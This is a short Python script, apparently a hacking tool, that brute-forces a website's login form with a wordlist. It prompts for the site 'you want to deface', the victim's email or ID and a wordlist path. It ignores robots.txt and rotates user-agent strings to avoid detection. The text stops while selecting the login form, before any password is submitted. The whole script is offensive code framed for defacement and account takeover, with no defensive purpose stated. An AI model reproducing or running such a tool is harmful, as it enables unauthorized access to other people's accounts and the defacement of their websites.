import mechanize
from bs4 import BeautifulSoup
import random
from banner import *
b = mechanize.Browser()

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################

print(yl+banner)
url=input(wi+"Name of the website you want to deface:  ")
mail = input(wi+"Name of the select form: (example:- name = email:):  ")
email =input(wi+"email or id of the victicms: ")
passwd =input(wi+"Name of the select form: (example:- name = password:):  ")
word = input(wi+"Path for your wordlist   ")
try:
    word = open(word, "r")
    
except:
    print(rd+" the path to your wordlist is not found  " +word )
    input("press Enter key to exit")
    exit()
for password in word:
    b.set_handle_equiv(False)
    b.set_handle_robots(False)
    b.set_handle_robots(False)
    b._factory.is_html = True
    b.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]

    b.open(url)
    b.select_form(id = "")